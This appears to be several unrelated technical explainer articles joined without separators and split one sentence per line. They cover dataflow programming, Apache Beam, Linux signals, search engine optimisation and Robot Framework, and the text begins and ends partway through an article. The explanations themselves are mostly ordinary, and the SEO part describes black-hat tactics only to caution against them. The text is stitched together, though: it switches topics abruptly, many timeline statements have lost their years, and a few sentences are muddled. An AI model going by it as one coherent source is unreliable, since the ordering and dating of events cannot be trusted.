To address this , we can prohibit global variables and call - by - reference .
Arrays are not modified but created anew when changes are made .
Thus , arrays are treated as values rather than objects .
Even errors are handled by error values instead of setting global status flags and interrupting the program .
Since variables are really values , the statement ` S = X+Y ` is seen as a definition , not an assignment .
In fact , languages that do all processing by applying operators to values have been called applicative languages .
Could you list some dataflow languages ?
Screenshot from Quartz Composer available in Apple 's Xcode .
Source : Powell 2008 .
Dataflow programming is not limited to visual programming .
Early languages were textual with no graphical representation .
Visual languages enable end - user programming .
Textual languages are faster to work with but need expert knowledge .
The Textual languages of the early 1980s were VAL ( MIT ) and ID ( Univ .
Cal .
Irvine ) .
Lucid was developed for program verification but can also be used for dataflow computation .
In the late 1980s , SISAL was invented .
Based on VAL , it offered Pascal - like syntax and outperformed Fortran on some benchmarks .
Other textual languages include CAL , COStream , Lustre , Joule , Oz , Swift ( scripts ) , SIGNAL , SystemVerilog , and VHDL .
The ` make ` software commonly used in UNIX systems is also an example of dataflow programming .
Among DFVPLs are Keysight VEE , KNIME , LabVIEW , Microsoft Visual Programming Language , Orange , Prograph , Pure Data , Quartz Composer , and Simulink .
More examples include Node - RED , Max MSP , and Lego Mindstorms .
Even spreadsheets are considered examples of visual DFP .
Each cell is a node .
When a cell value is updated , it sends its new value to other cells that depend on it .
What other programming paradigms are closely related to dataflow programming ?
Flow - Based Programming ( FBP ) is a subclass of DFP .
While DFP can be synchronous or asynchronous , FBP is always asynchronous .
FBP allows multiple input ports , has bounded buffers and applies back pressure when buffers fill up .
Java , C # , C++ , Lua and JavaScript support FBP .
DrawFBP and Slang are visual languages for FBP .
Reactive Programming is event - driven , asynchronous and non - blocking .
It 's usually supported by callbacks and functional composition ( declarative style of programming ) .
Like DFP , the focus is on the flow of data rather than the flow of control .
Programming abstractions that support this include futures / promises , reactive streams , and dataflow variables .
Akka Streams , Ratpack , Reactor , RxJava , and Vert.x are libraries for JVM that support reactive programming .
In JavaScript , there 's Bacon.js .
Like DFP , Functional Programming is free from side effects , mostly determinate and has locality of effect .
However , it 's possible to have a convoluted functional program that ca n't be implemented as a dataflow graph .
It 's been said that dataflow languages are essentially functional but use imperative syntax .
Carl Hewitt 's Actor Model from the 1970s is relevant to DFP .
Actors are equivalent to nodes .
Many languages , such as Scala , support the actor model .
What are some shortcomings or challenges with dataflow programming ?
Visual dataflow languages can be cumbersome for large programs with many nodes .
Iterations and conditions are hard to represent visually .
Debugging is difficult since multiple operations happen concurrently .
In general , better tooling is needed .
Many DFVPLs aim to make programming easier for end users .
The original motivation to exploit parallelism has become secondary .
DFP 's deterministic nature can be a problem .
Some use cases ( such as ticket booking or database access ) are inherently non - deterministic .
To solve this , DFP must allow for non - deterministic merging of multiple input streams .
Spreadsheets , when seen via the dataflow paradigm , have their limitations .
Formulas are hard to inspect .
They 're not suited for refactoring and reuse .
Deployment and scalability are practical issues .
However , solutions have been proposed to address all of these .
Among modern languages , Clojure , Groovy , Scala , Ruby , F # and C # support DFP but offer no syntactic support for dataflow variables .
Even simple dataflow examples in F # and C # require a lot of boilerplate code .
The idea of dataflow networking can be traced to the work of John von Neumann and other researchers in the 1940s and 1950s in the context of the " neuron net " model of finite state automata .
In the early 1960s , Carl Adam Petri introduced the Petri Net model for concurrent systems .
A dataflow network is a network of computers connected by communication links .
Nodes are activated by the arrival of messages on their links .
Written statements and their equivalent dataflow graph .
Source : Sutherland 1966 , fig .
3.1 .
Sutherland proposes a two - dimensional graphical method to define programs .
He gives examples of written statements and their graphical equivalents .
Where a symbol appears in two places , two equivalent connections appear in the graphical form .
Intermediate values need not be named in the graph .
Graphs are also explicit about multiple outputs .
He uses the terms " flow input " and " flow output " .
Kosinski publishes a paper titled A data flow language for operating systems programming .
Programs use function composition .
Primitive notions of iteration , recursion , conditionals , and data replication / aggregation / selection are employed .
Researchers look to create dataflow languages since they find that imperative languages ca n't be compiled easily for dataflow hardware .
Davis created the first visual dataflow language called Data - Driven Nets ( DDNs ) .
Dataflow graphs have become programming aids rather than simply representations of textual programs .
Practical visual programming languages appeared only in the early 1980s with Graphical Programming Language ( GPL ) and Function Graph Language ( FGL ) .
However , their development is hampered by graphical limitations of current hardware .
Weng develops the Textual Data - Flow Language ( TDFL ) , one of the first purpose - built dataflow languages .
Many other languages follow suit : LAU ( 1976 ) , Lucid ( 1977 ) , I d ( 1978 ) , LAPSE ( 1978 ) , VAL ( 1979 ) , Cajole ( 1981 ) , DL1 ( 1981 ) , SISAL ( 1983 ) and Valid ( 1984 ) .
A dataflow interpreter .
Source : Denning 1978 , fig .
9 .
Denning notes that dataflow languages are being developed at MIT , at IBM T.J. Watson Research Center , at the University of California at Irvine , and at IRIA Laboratory in France .
A compiler would translate language syntax into a dataflow graph to be executed by an interpreter .
When an operator is ready to run because its operands are available on the input links , the interpreter sends it as a packet to an extractor network , which routes the packet to a function unit .
Results are fed back through an insertion network .
Though DFP was expected to eclipse von Neumann architecture , by mid-1980s it 's clear that this had n't happened .
Researchers realize that this is probably because parallelism in dataflow architectures is too fine - grained .
This starts a trend towards hybrid architectures and coarse - grained parallelism .
Many dataflow instructions are grouped together and run in sequence , though obeying the rules of the dataflow execution model .
Due to computers with better graphics , this decade saw the rise of Dataflow Visual Programming Languages ( DFVPLs ) .
LabView ( 1986 ) and NL ( 1993 ) are two well - known languages of the 1990s .
The main motivation for DFVPLs is software engineering rather than parallelism .
DFVPLs enable programmers to create programs by wiring dataflow graphs .
Apache Beam makes your data pipelines portable across languages and runtimes .
Source : Mejía 2018 , fig .
1 .
With the rise of Big Data , many frameworks have emerged to process that data .
These are either for batch processing , stream processing or both .
Examples include Apache Hadoop MapReduce , Apache Spark , Apache Storm , and Apache Flink .
The problem for developers is that once a better framework arrives , they have to rewrite their code .
Mature old codes are replaced with immature new codes .
They may even have to maintain two codebases and pipelines , one for batch processing and another for stream processing .
Apache Beam aims to solve this problem by offering a unified programming model for both batch and streaming workloads that can run on any distributed processing backend execution engine .
Beam offers SDKs in a few languages .
It supports a number of backend execution engines .
Why do I need Apache Beam when there are already so many data processing frameworks ?
Having many processing frameworks is part of the problem .
Developers have to write and maintain multiple pipelines to work with different frameworks .
When a better framework comes along , there 's significant effort involved in adopting it .
Apache Beam solves this by enabling and reusing a single pipeline across multiple runtimes .
The benefit of Apache Beam is therefore both in development and operations .
Developers can focus on their pipelines and less on the runtime .
Pipelines have become portable .
Therefore , there 's no lock - in to a particular runtime .
Beam SDKs allow developers to quickly integrate a pipeline into their applications .
The Beam Model offers powerful semantics for developers to think about data processing at a higher level of abstractions .
Concepts such as windowing , ordering , triggering and accumulation are part of the Beam model .
Beam has auto - scaling .
It looks at current progress in dynamically reassigning work to idle workers or scaling up / down the number of workers .
Since Apache Beam is open source , support for more languages ( by SDK writers ) or runtimes ( by runner writers ) can be added by the community .
What are the use cases served by Apache Beam ?
Some use cases of Apache Beam .
Source : Iyer and Onofré 2018 .
Apache Beam is suitable for any task that can be parallelized by breaking down the data into smaller parts , each part running independently .
Beam supports a wide variety of use cases .
The simplest ones are perhaps Extract , Transform , Load ( ETL ) tasks that are typically used to move data across systems or formats .
Beam supports batch as well as streaming workloads .
In fact , the name Beam signifies a combination of " Batch " and " Stream " .
It therefore presents a unified model and API to define parallel processing pipelines for both types of workloads .
Applications that use multiple streaming frameworks ( such as Apache Spark and Apache Flink ) can adopt Beam to simplify the codebase .
A single data pipeline written in Beam can address both execution runtimes .
Beam can be used for scientific computations .
For example , Landsat data ( satellite images ) can be processed in parallel and Beam can be used for this use .
IoT applications often require real - time stream processing where Beam can be used .
Another use case is computing scores for users in a mobile gaming app .
Which are the programming languages and runners supported by Apache Beam ?
Test status summary of Beam for languages and runners .
Source : Apache Beam GitHub 2020a .
Apache Beam started with a Java SDK .
By 2020 , it will support Java , Go , Python2 and Python3 .
Scio is a Scala API for Apache Beam .
Among the main runners supported are Dataflow , Apache Flink , Apache Samza , Apache Spark and Twister2 .
Others include Apache Hadoop MapReduce , JStorm , IBM Streams , Apache Nemo , and Hazelcast Jet .
Refer to the Beam Capability Matrix for more details .
The Java SDK supports the main runners , but other SDKs support only some of them .
This is because the runners themselves are written in Java , which makes support for non - Java SDKs non - trivial .
Beam 's portability framework aims to improve this situation and enable full interoperability .
This framework would define data structures and protocols that can match any language to any runner .
Direct Runner is useful during development and testing for execution on your local machine .
Direct Runner checks if your pipeline conforms to the Beam model .
This brings greater confidence that the pipeline will run correctly for various runners .
Beam 's portability framework comes with Universal Local Runner ( ULR ) .
This complements the Direct Runner .
What are the essential programming abstractions in Apache Beam ?
An example of branching a pipeline with three transforms .
Source : Apache Beam Docs 2020d , fig .
2 .
Beam provides the following abstractions for data processing : ` Pipeline ` : Encapsulates the entire task , including reading input data , transforming data and writing output .
Pipelines are created with options using ` PipelineOptionsFactory ` that returns a ` PipelineOptions ` object .
Options can specify , for example , location of data , runner to use or runner - specific configuration .
A pipeline can be linear or branching .
` PCollection ` : Represents the data .
Every step of a pipeline inputs and outputs ` PCollection ` objects .
The data can be bounded ( eg .
read from a file ) or unbounded ( eg .
streamed from a continuous source ) .
` PTransform ` : Represents an operation on the data .
Inputs are one or more ` PCollection ` objects .
Outputs are zero or more ` PCollection ` objects .
A transform does n't modify the input collection .
I / O transforms reading and writing to external storage .
Core Beam transforms include ` ParDo ` , ` GroupByKey ` , ` CoGroupByKey ` , ` Combine ` , ` Flatten ` , and ` Partition ` .
Built - in I / O transforms can connect to files , filesystems ( eg .
Hadoop , Amazon S3 ) , messaging systems ( eg .
Kafka , MQTT ) , databases ( eg .
Elasticsearch , MongoDb ) , and more .
What 's the Beam execution model ?
Creating a pipeline does n't imply immediate execution .
The designated pipeline runner will construct a workflow graph of the pipeline .
Such a graph connects collections via transforms .
Then the graph is submitted to the distributed processing backend for execution .
Execution happens asynchronously .
However , some runners , such as Dataflow , support blocking execution .
What are some essential concepts of the Beam model ?
The Beam Model along as an example .
Source : Adapted from Akidau 2016 .
Data often has two associated times : event time , when the event actually occurred , and processing time , when the event was observed in the system .
Typically , processing time lags event time .
This is called skew and it 's highly variable .
Bounded or unbounded data is grouped into windows by either event time or processing time .
Windows themselves can be fixed , sliding or dynamic such as based on user sessions .
Processing can also be time - agnostic by chopping unbounded data into a sequence of bounded data .
Data can arrive out of order and with unpredictable delays .
There 's no way of knowing if all data applicable to an event - time window has arrived .
Beam overcomes this by tracking watermarks , which gives a notion of data completeness .
When a watermark is reached , the results are materialized .
We can also materialize early results ( before the watermark is reached ) or late results ( data arriving after the watermark ) using triggers .
This allows us to refine results over time .
Finally , accumulation tells how to combine multiple results in the same window .
Could you point to useful developer resources to learn Apache Beam ?
Apache Beam 's official website contains quick start guides and documentation .
The Overview page is a good place to start .
There 's an example of trying out Apache Beam in Colab .
The Programming Guide is essential reading for developers who wish to use Beam SDKs and create data processing pipelines .
Visit the Learning Resources page for links to useful resources .
On GitHub , there 's a curated list of Beam resources and a few code samples .
Developers who wish to contribute to the Beam project should read the Contribution Guide .
The code is on GitHub .
The codebase also includes useful examples .
For example , Python examples are in the folder path ` sdks / python / apache_beam / examples ` and Go examples in ` sdks / go / examples ` .
Jay Kreps questions the need to maintain and execute parallel pipelines , one for batch processing ( eg .
using Apache Hadoop MapReduce ) and one for stream processing ( eg .
using Apache Storm ) .
The batch pipeline gives exact results and allows data reprocessing .
The streaming pipeline has low - latency and gives approximate results .
This is called Lambda Architecture .
Kreps instead proposes , " a language or framework that abstracts over both the real - time and batch framework .
" Streaming systems at Google that lead to Apache Beam .
Source : Akidau 2015a , 1:00 .
At a Big Data conference in London , Google engineer Tyler Akidau talks about streaming systems .
He introduces some of those currently used at Google : MillWheel , Google Flume , and Cloud Dataflow .
In fact , Cloud Dataflow is based on Google Flume .
These recent developments bring greater maturity to streaming systems , which so far have remained less mature compared to batch processing systems .
Beam 's logo was released in February 2016 .
Source : Apache Beam 2020d .
In February , Google 's Dataflow was accepted by Apache Software Foundation as an Incubator Project .
It 's named Apache Beam .
The open - sourced code includes Dataflow Java SDK , which already supports four runners .
There are plans to build a Python SDK .
Google Cloud Dataflow will continue as a managed service executing on the Google Cloud Platform .
Beam logo is also be released in February .
Apache Beam graduates from being an incubator project to a top - level Apache project .
During the incubation period ( 2016 ) , the code was refactored and documentation was improved in an extensible vendor - neutral manner .
Beam 2.0 has been released .
This is the first stable release of Beam under the Apache brand .
It 's said that Beam is at this point " truly portable , truly engine agnostic , truly ready for use .
" With the release of Beam 2.5.0 , Go SDK is now supported .
Go pipelines run on Dataflow runner .
Beam 2.23.0 has been released .
This release supports Twister2 runner and Python 3.8 .
It removes support for runners Gearpump and Apex .
Common sources of Linux signals .
Source : Brown 2015 .
A Linux computer system has many processes in different states .
These processes belong to either user applications or the operating system .
We need a mechanism for the kernel and these processes to coordinate their activities .
One way to do this is for a process to inform others when something important happens .
This is why we have signals .
A signal is basically a one - way notification .
A signal can be sent by the kernel to a process , by a process to another process , or a process to itself .
Linux signals trace their origins to Unix signals .
In later Linux versions , real - time signals were added .
Signals are a simple and lightweight form of interprocess communication , and therefore suited for embedded systems .
What are the essential facts about Linux signals ?
Describing a few important Linux signals .
Source : Walberg and Brunson 2015 , table 7 - 2 .
There are 31 standard signals , numbered 1 - 31 .
Each signal is named as " SIG " followed by a suffix .
Starting from version 2.2 , the Linux kernel supports 33 different real - time signals .
These have numbers 32 - 64 but programmers should instead use the ` SIGRTMIN+n ` notation .
Standard signals have specific purposes but the use of SIGUSR1 and SIGUSR2 can be defined by applications .
Real - time signals are also defined by applications .
Signal number 0 , which POSIX.1 calls null signal , is generally not used , but the ` kill ` function uses this as a special case .
No signal is sent but it can be used ( rather unreliably ) to check if the process still exists .
Linux implementation of signals is fully POSIX compliant .
Newer implementations should prefer to use ` sigaction ` rather than the traditional ` signal ` interface .
Just as hardware subsystems can interrupt the processor , signals interrupt process execution .
They are therefore seen as software interrupts .
While interrupt handlers process hardware interrupts , signal handlers process signals .
Some signals are mapped to specific key inputs : SIGINT for ` ctrl+c ` , SIGSTOP for ` ctrl+z ` , SIGQUIT for ` ctrl+\ ` .
How does a signal affect the state of a Linux process ?
For example , the exchange of signals between parent and child processes .
Source : Marek 2012 .
Some signals terminate the receiving process : SIGHUP , SIGINT , SIGTERM , SIGKILL .
There are signals that terminate the process along with a core dump to help programmers debug what went wrong : SIGABRT ( abort signal ) , SIGBUS ( bus error ) , SIGILL ( illegal instruction ) , SIGSEGV ( invalid memory reference ) , SIGSYS ( bad system call ) .
Other signals stop the process : SIGSTOP , SIGTSTP .
SIGCONT is a signal that resumes a stopped process .
A program could override default behaviour .
For example , an interactive program could be written to ignore SIGINT ( generated by ` ctrl+c ` input ) .
Two notable exceptions are SIGKILL and SIGSTOP signals , which ca n't be ignored , blocked or overridden this way .
Let 's consider the example of a parent 's process and their child 's process .
Suppose the child sends SIGSTOP to itself , the child 's process will be stopped .
This in turns triggers SIGCHLD to the parent .
The parent can then signal the child to continue using SIGCONT .
When a child comes out of stopped state , another SIGCHLD is sent to the parent .
If later , the child exits , the final SIGCHLD is sent to the parent .
Are n't signals similar to exceptions ?
Some programming languages are capable of exceptions , using constructs such as ` try - throw - catch ` .
Signals are not similar to exceptions .
Instead , failed system or library calls return non - zero exit codes .
When a process is terminated , its exit code will be 128 plus signal number .
For example , a process killed by SIGKILL will return 137 ( 128 + 9 ) .
Are Linux signals synchronous or asynchronous ?
When signals are generated , they can be considered as synchronous or asynchronous .
Synchronous signals occur as a result of instructions that have led to an unrecoverable error such as an illegal address access .
These signals are sent to the thread that caused it .
These are also called traps , since they also cause a trap in the kernel trap handler .
Asynchronous signals are external to the current execution context .
Sending SIGKILL from another process is an example of this .
These are also called software interrupts .
What 's the typical lifecycle of a signal ?
Signals when handled interrupt program execution .
Source : Brown 2015 .
A signal goes through three stages : Generation : A signal can be generated by the kernel or any of the processes .
Whoever generates the signal , addresses it to a specific process .
A signal is represented by its number and has no extra data or arguments .
Thus , signals are lightweight .
However , extra data can be passed along for POSIX real - time signals .
System calls and functions that can generate signals include ` raise ` , ` kill ` , ` killpg ` , ` pthread_kill ` , ` tgkill ` , and ` sigqueue ` .
Delivery : A signal is said to be pending until it 's delivered .
Normally , a signal is delivered to a process as soon as possible by the kernel .
However , if the process has blocked the signal , it will remain pending until unblocked .
Processing : Once a signal is delivered , it is processed in one of many ways .
Every signal has an associated default action : ignore the signal ; or terminate the process , sometimes with a core dump ; or stop / continue the process .
For non - default behaviour , handler function can be called .
Exactly which of these happens is specified via the ` sigaction ` function .
Could you explain the concept of blocking and unblocking signals ?
Signals remain pending until they are unblocked for delivery .
Source : Lynx 2019 .
Signals interrupt the normal flow of program execution .
This is undesirable when the process is executing some critical code or updating data that 's shared with signal handlers .
Blocking solves this problem .
The tradeoff is that signal handling is delayed .
Every process can specify if it wants to block a specific signal .
If blocked and the signal does occur , the operating system will hold the signal as pending .
The signal will be delivered once the process unblocks it .
The set of currently blocked signals is called signal mask .
There 's no point in blocking a signal indefinitely .
For this purpose , the process can instead ignore the signal once it 's delivered .
A signal blocked by one process does n't affect other processes , who can receive the signal normally .
Signal mask can be set using ` sigprocmask ` ( single - threaded ) or ` pthread_sigmask ` ( multi - threaded ) .
When a process has multiple threads , a signal can be blocked on a per thread basis .
A signal will be delivered to any one thread that has n't blocked it .
Essentially , signal handlers are per process , signal masks are per thread .
Can we have more than one signal pending for a process ?
Yes , many standard signals can be pending for a process .
However , only one instance of a given signal type can be pending .
This is because pending and blocking of signals are implemented as bitmasks , with one bit per signal type .
For example , we can have SIGALRM and SIGTERM pending at the same time , but we ca n't have two SIGALRM signals pending .
The process will receive only one SIGALRM signal even if raised multiple times .
With real - time signals , signals can be queued along with data , so that each instance of the signal can be individually delivered and handled .
POSIX does n't specify the order of delivery for standard signals , or what happens if both standard and real - time signals are pending .
Linux gives priority to standard signals .
For real - time signals , lower numbered signals are delivered first , and if many are queued for a signal type , the earliest one is delivered first .
Signals are described in the POSIX.1 - 1990 standard .
These can be traced to the IEEE Std 1003.1 - 1988 .
Real - time extensions are released as POSIX.1b .
This includes real - time signals .
Linux starts supporting real - time signals with the release of kernel version 2.2 .
Listing Linux signals using the kill command .
Source : Choudhary 2018 .
More signals are added in the POSIX.1 - 2001 standard : SIGBUS , SIGPOLL , SIGPROF , SIGSYS , SIGTRAP , SIGURG , SIGVTALRM , SIGXCPU , SIGXFSZ .
Some on - page and off - page SEO techniques .
Source : The Hoth 2019a .
Users online use search engines to find information or resources .
If you 're the owner of a website , you always want to bring more visitors to your site .
If search engines give better visibility to your site in response to relevant search queries , this would translate to more visitors .
But how do you tell search engines that your site is better than others ?
This is where Search Engine Optimization ( SEO ) plays an important part .
SEO is the process of applying a set of techniques so that search engines rank your site or page higher , without you paying them to do so .
We could optimize on content , organization , design , performance , etc .
To know what to optimize is not obvious and requires a good understanding of the many factors that search engines use to rank web pages .
What are some important factors that search engines use for ranking web pages ?
Ranking factors used by Google search engine .
Source : Moz 2013 .
As of December 2018 , it 's recognized that Google uses more than 200 ranking factors .
These can be categorized into domain related , site level or page level factors .
For example , a keyword appearing in a domain name can boost ranking .
At site level , content uniqueness , content freshness , site trust rank , site architecture , use of HTTPS , and usability are some factors .
At page level , use of keywords in title tag , content length , topic coverage , and loading speed are some factors .
Search results that get more clicks may be ranked better in the future .
Bounce rate may be used to adjust ranking .
Repeat visits to a page and higher dwell time ( time spent on a page ) may boost ranking .
Likewise , pages with lots of comments may get a boost .
Search engines may also apply algorithmic rules .
For example , priority may be given to recently published pages due to freshness .
For diversity , results may include different interpretations of the keyword .
The user 's search history is used to give contextual results .
Geo - targeted matches may be given priority for some queries .
If there 's only one important SEO technique , what would it be ?
In the words of Google SEO Starter Guide 2017 , Creating compelling and useful content will likely influence your website more than any of the other factors discussed here .
Content comes first .
It should be unique and of high quality .
It should add value to those who visit your site .
When it 's backed by great design , we can achieve great user experience across devices .
This means that aiming for a higher search ranking is not the primary goal .
The focus should be on content and user experience .
Every other SEO technique should not stray from this focus .
Apart from this , SEO is about keywords , links , relevance , reputation and trust .
What 's the meaning of link building for SEO ?
Example structure of internal links .
Source : Jessier 2018 .
Link building is the process of getting more links to your own webpages .
Incoming links , also called backlinks , are an important SEO signal that leads to better ranking .
The total number of links , number of linking root domains , the number of links from separate C - class IPs are all important .
Age and authority of pages or domains linking to your site are also important .
The anchoring text used for a backlink is also relevant .
The recommended approach is to earn backlinks rather than buy them .
Earning backlinks is a slow process , but this builds your site 's reputation in a natural way for better long - term results .
To earn backlinks , create unique high - quality content , promote your content , get positive reviews from influencers , and partner with relevant sites without resorting to link scheming .
Internal link building is something over which you have greater control .
Build internal links based on keyword research and information architecture of your site .
Map each page to keywords and user intent .
Use this to create an SEO wireframe to help you build internal links .
Use navigation bars , menus and breadcrumbs to link to key pages .
How can I make use of social signals for better SEO ?
Social signals are basically user engagement on social media platforms .
These include likes , shares , comments , and so on .
Social signals are important for ranking in the Bing search engine .
Google Search has said that social signals do n't directly influence ranking .
However , research has shown a good correlation between ranking and social signals .
This is because social signals amplify other SEO factors that in turn affect ranking .
It therefore makes sense to optimize your social presence to indirectly affect ranking .
Your profile and branding should be consistent across platforms .
Link your profiles to your site .
Post regularly across platforms .
post per day about 15 tweets , 1 LinkedIn post , 1 Facebook post , and 2 Instagram posts .
Use viral headlines and images in posts .
Use hashtags , which are essentially keywords .
Explicitly ask for shares .
On your web pages , use social media plugins to make sharing easier .
For best possible engagement , share only your best posts .
What should web designers keep in mind for better SEO ?
Interaction design can enable both SEO and UX .
Source : Taylor 2013 .
Designers should design for SEO rather than just user experience ( UX ) .
One approach is to make good use of interactions ( such as mouseover or mouse click ) and expandable elements .
For example , a page can load with a minimalistic view but via interactions give more information that 's also crawlable .
Image - based banners and call - to - action elements are not crawlable .
The image 's ` alt ` attribute is plain text and of limited length .
Instead , go for crawlable text - based design using webfonts , HTML and CSS , along with schema markup .
Design should be responsive .
More than just fitting different screen sizes , we aim for consistent UX across devices .
For example , have a fluid design that maintains proportions .
Google 's Mobile - Friendly Test can inform you if your site is well designed for mobiles .
Use header tags to organize content both for visitors and search engines .
Using header tags on sidebars , header and footers is not good SEO practice .
Pop - ups and banners are penalized in mobile SEO .
Due to voice interfaces , prioritize your design to be heard rather than seen .
What is meant by black hat SEO versus white hat SEO ?
Comparing black hat versus white hat SEO techniques .
Source : Patel 2015 .
White Hat SEO is when an SEO professional does n't deviate from the rules defined by search engines .
Getting results via white hat SEO takes time , but they also last longer .
Sites using only white hat SEO will not be penalized by search engines since they play by the rules .
Black Hat SEO is when an SEO professional tries to game the system to get better rankings .
Search engine guidelines and rules are flouted .
Black hat techniques may give quick results , but there 's a risk of getting penalized .
However , we should point out that breaking search engine rules is not illegal .
Buying links is a black hat technique .
Automatically following someone who follows you on social media is another one .
Cloaking is a black hat practice of showing one version of a web page to search for crawlers and another version to normal visitors .
Another one is keyword stuffing where irrelevant keywords are forced into a page .
In practice , no site is 100 % white hat .
When white hat SEO professionals try to acquire links , they 're crossing into " gray hat " territory .
Are there SEO techniques that I should avoid ?
Google has shared some techniques to avoid : automatically generated content , scraped content , pages with little original content , cloaking , sneaky redirects , hidden texts or links , doorway pages , using irrelevant keywords , abusing rich snippets markup , sending automated queries to Google , etc .
Too many ads on a page lowers the ranking .
Bing has shared a similar list to avoid : link buying or spamming , social media schemes , meta refresh redirects , duplicated content , keyword stuffing and misleading markups .
Do n't optimize on a single keyword , since search engines focus on search intent .
Do n't design for just desktops .
Make your design mobile - friendly , fast , and responsive .
Do n't focus on quantity by duplicating or copying content ; quality of your content is more important .
Do n't put important content on formats that most likely wo n't be crawled , such as PDF files or images .
Worse still , using ` noindex ` in meta tags or robots.txt files wrongly can tell crawlers to ignore your content .
Finally , do n't think that SEO is a one - time task .
Keep adding new content to your site .
If you change your site 's structure , properly redirect old URLs .
Stay updated on new SEO trends .
What are some common myths about SEO ?
Here are some SEO myths and clarifications of the same : Boost your rankings overnight by hiring an SEO agency : Improving rankings takes time .
Guest blogging is obsolete : avoid spamming blogs and publish quality content .
SEO is a one - time effort : it 's a continuous process .
Link building is dangerous : growing links naturally without being manipulative .
CTR is no longer relevant : they still influence ranking , but clicks from bots will be penalized .
Keywords and keyword research are dead : they 're important but think in terms of context and search intent ; keyword ratio is useless .
Keyword - optimized anchor text is bad : it 's bad if it 's overoptimized ; hence the aim for diversity ( natural , brand , URL , generic ) .
Paid rankings will improve organic rankings : they 're in fact treated separately .
XM sitemap improves rankings : it does n't but search engines will index the site faster .
Meta tags are irrelevant : they do n't affect rankings , but they help search engines understand your site better .
H1 tags are important for rankings : not really , but use them to organize your content and help users navigate more easily .
What are some tools that help with SEO ?
The Google Search Console is an essential tool .
Formerly called Google Webmaster Tools , it provides rankings and traffic reports for keywords and pages .
For backlink analysis , AHREFs and Majestic are useful .
With these , we get to know who 's linking to our site or to the sites of our competitors .
With this information , we can plan for link building .
Similar tools include Buzzsumo , FollowerWonk , and Little Bird .
For keyword research , use Google 's Keyword Planner , although this is useful only for paid search .
For organic search , consider using Moz Keyword Explorer tool and SEMRush ’s Keyword Magic Tool .
Google Trends is also useful for competitive analysis of keywords .
Since performance is an SEO factor , use Google PageSpeed Insights , Pingdom , or WebPageTest to know areas where performance can be improved .
For local SEO , use Moz Local or Whitespark .
SEO platforms bring together many tools for analyzing and optimizing our site .
Moz , BrightEdge , Searchmetrics , Linkdex , and SEO PowerSuite are some examples .
To know if SEO is giving better results , use Google Analytics .
The history of SEO is naturally tied to the history of search engines .
What 's probably the world 's first search engine , Archie was released in 1990 .
The World Wide Web Wanderer , later called Wandex , was released in 1993 as one of the first web crawlers .
By 1994 , many search engines were operational , including Alta Vista , Infoseek , Lycos , and Yahoo .
Google itself was founded in 1998 , but it started in 1996 with the name BackRub .
Danny Sullivan launches Search Engine Watch , a site for news on the search industry and tips for better ranking .
For sponsored links and paid search , Goto.com was launched .
Advertisers bid on the site to rank higher than organic results .
In fact , organic results were bad since search engines did n't succeed against black hat practices .
The alternative was paid search or getting listed on popular directories such as Yahoo and DMOZ .
The first conference focused on search marketing , called Search Engine Strategies , took place .
Google Toolbar become available within the Internet Explorer browser .
This allows SEO practitioners to see their PageRank score .
Meanwhile , some folks started sharing SEO related information at a London pub .
This later evolves into Pubcon , a regular search conference .
With Google leading the search market , it released the Florida update .
Sites that were earlier ranked higher due to keyword stuffing ( a black hat practice ) , lose their ranking .
The Florida update gave better ranking for quality content and authentic backlinks .
This partly solves the problem created earlier by Blogger.com and Google 's AdSense that content creators gamed to make a quick buck .
Google started looking at local search intent and thus born local SEO .
This year is also when Google personalizes results based on search history and interests .
Google , Yahoo and MSN jointly created the ` nofollow ` attribute to combat spammy links and comments .
With Google 's Panda update ( delivered over many months ) , the search engine penalizes content farms created solely to drive search engine results .
This affected sites having scraped and unoriginal content .
Panda also penalized pages with high ad - to - content ratios .
With the Penguin update of Google Search , sites with overoptimized anchor text , or spammy hyperlinks are penalized .
Summary of Panda , Penguin and Hummingbird updates .
Source : Jimdo 2017 .
With the Hummingbird update of Google Search , search is based on keywords but results are more about search intent .
This update affects 90 % of searches worldwide .
Design for user intent among information ( to know ) , location ( to go ) , action ( to do ) , or shopping ( to buy ) .
To help search engines figure out intent , let each page have a singular purpose .
In April , Google Search got a mobile - friendly update named Mobilegeddon .
In October , Google released an AI - powered search named RankBrain .
It 's initially used to interpret 15 % of searches that Google has never seen before .
In later years , RankBrain played a more central role in all of Google 's searches .
The Robot Framework is a framework that automates acceptance testing and acceptance test - driven development .
Being generic in nature , the framework can also be used to automate business processes , often called Robotic Process Automation ( RPA ) .
The core of Robot Framework is written in Python , but libraries extending it can be in Python or Java .
The framework is independent of the operating system and application .
It 's open source and is sponsored by the Robot Framework Foundation .
Test cases in Robot Framework are written using keywords .
Keywords themselves are abstracted away from their implementation .
This promotes reuse of keywords across tests and easier maintenance of tests , particularly in large projects .
What are the benefits of using Robot Framework ?
An example test case in Robot Framework .
Source : Yurko 2018 , fig .
1 .
Since the Robot Framework is keyword - driven , it has the benefit of separating high - level descriptions of tests from the low - level implementation details .
Test writers may not be programmers .
Since keywords are closer to English than programming , test writers find it easier to write and maintain tests .
Keywords can be reused in tests .
Tests are easy to read since they often take a tabular form .
In this form , the first column contains keywords .
Other columns contain arguments about each keyword .
For example , " Create User " is a keyword that takes username and password as arguments .
When implemented , this can translate to launching a web browser , clicking a button , entering the data , and confirming the request to create a new user .
Keywords are composable .
This means that keywords themselves can depend on other keywords .
This allows us to create tests for different levels of abstraction .
Since implementation is kept separate , test cases can be developed agnostic of any programming language .
Testing can be planned at an early stage even before any implementation is ready .
What are the main features of the Robot Framework ?
While keyword - driven tests are common , Robot Framework can also be used to create data - driven and behaviour - driven tests .
It can also be used for automating any business process , and thus not limited to testing .
Test cases can be organized into test suites .
Execution can be based on test suites , test cases , or tags , all of which can be specified by name or pattern .
Test suites and test cases can have setup and teardown .
The framework produces neat reports and logs .
It also allows for debugging .
Developers can extend the framework with their own keywords and libraries .
Test cases can be created in a single text file but they can also be created within the Robot Framework IDE ( RIDE ) .
Some popular IDEs can integrate with the framework , including PyCharm , RED ( Robot Editor ) for Eclipse , and Robot Framework Intellisense for VS Code .
Could you list some built - in keywords used in the Robot Framework ?
Online documentation gives complete descriptions of all built - in keywords along with accepted arguments .
